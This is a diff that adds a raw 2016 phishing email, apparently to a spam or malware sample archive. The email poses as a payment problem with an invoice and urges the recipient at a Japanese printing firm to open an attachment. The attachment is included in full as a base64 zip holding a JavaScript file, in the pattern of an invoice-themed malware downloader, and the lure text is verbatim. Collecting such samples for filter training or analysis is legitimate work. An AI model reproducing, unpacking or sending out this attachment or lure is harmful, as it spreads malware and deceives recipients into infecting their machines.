@@ -1,0 +1,115 @@
+Return-Path: <Hamilton.Cary@cable.net.co>
+Received: from vg-cb003.ocn.ad.jp (vg-kg001.ocn.ad.jp [210.232.239.105])
+	by art-printing.co.jp (Postfix) with ESMTP id F3F023F01708
+	for <a-kato@art-printing.co.jp>; Fri, 25 Nov 2016 10:04:45 +0900 (JST)
+Received: from b-oaf0032.ocn.ad.jp (b-oaf0032.ocn.ad.jp [153.128.48.111])
+	by vg-cb003.ocn.ad.jp (Postfix) with ESMTP id E554F5602AF
+	for <a-kato@art-printing.co.jp>; Fri, 25 Nov 2016 10:04:45 +0900 (JST)
+Received: from of-omf-fcb022.ocn.ad.jp (of-omf-fcb022.ocn.ad.jp [153.149.209.135])
+	by b-oaf0032.ocn.ad.jp (Postfix) with ESMTP id C9244C00286
+	for <a-kato@art-printing.co.jp>; Fri, 25 Nov 2016 10:04:45 +0900 (JST)
+Received: from of-omf-fcb022 (localhost [127.0.0.1])
+	by of-omf-fcb022.ocn.ad.jp  with ESMTP id uAP14jRn009263
+	for <a-kato@art-printing.co.jp>; Fri, 25 Nov 2016 10:04:45 +0900
+Received: from of-omf-fcb022.ocn.ad.jp with LMTP by of-omf-fcb022 (3.2.0/sieved-3-2-SW-build-1409)
+	for <a-kato@art-printing.co.jp>; Fri, 25 Nov 2016 10:04:45 +0900
+Received: from ntt.pod01.ov-mta-ucb013 (ov-mta-ucb013.ocn.ad.jp [153.149.210.227])
+	by of-omf-fcb022.ocn.ad.jp  with ESMTP id uAP14hOL008842
+	for <a-kato@art-printing.co.jp>; Fri, 25 Nov 2016 10:04:45 +0900
+Received: from ofmgw0221.ocn.ad.jp ([153.149.229.71])
+	by ntt.pod01.ov-mta-ucb013 with 
+	id C14l1u00K1Z4PSH0114lxZ; Fri, 25 Nov 2016 01:04:45 +0000
+Received-SPF: none (OCN: of-ofc-ucb022: transitioning domain does not provide an SPF record) client-ip=186.147.210.146; envelope-from=<Hamilton.Cary@cable.net.co>; helo=Static-IP-186147210146.cable.net.co;
+Authentication-Results: of-ofc-ucb022; spf=none smtp.mailfrom=Hamilton.Cary@cable.net.co
+Received: from Static-IP-186147210146.cable.net.co (unknown [186.147.210.146])
+	by ofmgw0221.ocn.ad.jp (Postfix) with ESMTP id 531ACC80252
+	for <a-kato@art-printing.co.jp>; Fri, 25 Nov 2016 10:04:39 +0900 (JST)
+Received: from internal (unknown [x.x.x.x])
+Received: (nullmailer pid 00069 invoked by uid 6120054);
+	Thu, 24 Nov 2016 20:04:32 -0500
+To: <a-kato@art-printing.co.jp>
+Subject: [MEIWAKU!!] It Is Important
+X-PHP-Originating-Script: 6120054:SendMail.class.php
+From: "Cary Hamilton" <Hamilton.Cary@cable.net.co>
+Date: Thu, 24 Nov 2016 20:04:32 -0500
+MIME-Version: 1.0
+Content-Type: multipart/related; boundary="5bb5749bf125d5b2dd1db9ee99f1f96c"
+Message-Id: <1411764235.775358.33477.SendMail@art-printing.co.jp>
+X-OCN-SPAM-CHECK: 100.00%
+X-OCN-ANALYSIS: v=2.1 cv=SKBYL7bH c=1 sm=1 tr=0
+	p=IyPH0oA2bR7vVURErLqN0A==:17 p=OeuOCcSZ7P7j2YaWEZEA:9
+	p=UcyKKlTcAHxGActx8vsA:9 p=ddFNkW6GA0iHEpF4NQjF:22
+	p=ZBTwm510EvPyRja9c5-J:22 p=s-dvUTlfXfLH9j0M4SLM:22
+	a=hjseKDlP0QdRHoAXqi9TOg==:117 a=L9H7d07YOLsA:10 a=9cW_t1CCXrUA:10
+	a=s5jvgZ67dGcA:10 a=MKtGQD3n3ToA:10 a=xxPYsWa9ij0A:10 a=L24OOQBejmoA:10
+	a=pCbbxdC0P98A:10 a=ZZnuYtJkoWoA:10 a=wPNLvfGTeEIA:10 a=IKIoO-ieCDEA:10
+	a=5MxXyNQ-P-6J4PTiW665:22
+
+--5bb5749bf125d5b2dd1db9ee99f1f96c
+Content-type: text/plain; charset=iso-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+Dear a-kato, we received your invoice but couldn't pay, because your =
+requisites were invalid.
+Sending you the report of the problem - please open the attachment and =
+check the data.
+--5bb5749bf125d5b2dd1db9ee99f1f96c
+Content-Type: application/zip; name="INVOICE_a-kato.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INVOICE_a-kato.zip"
+
+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
+--5bb5749bf125d5b2dd1db9ee99f1f96c--
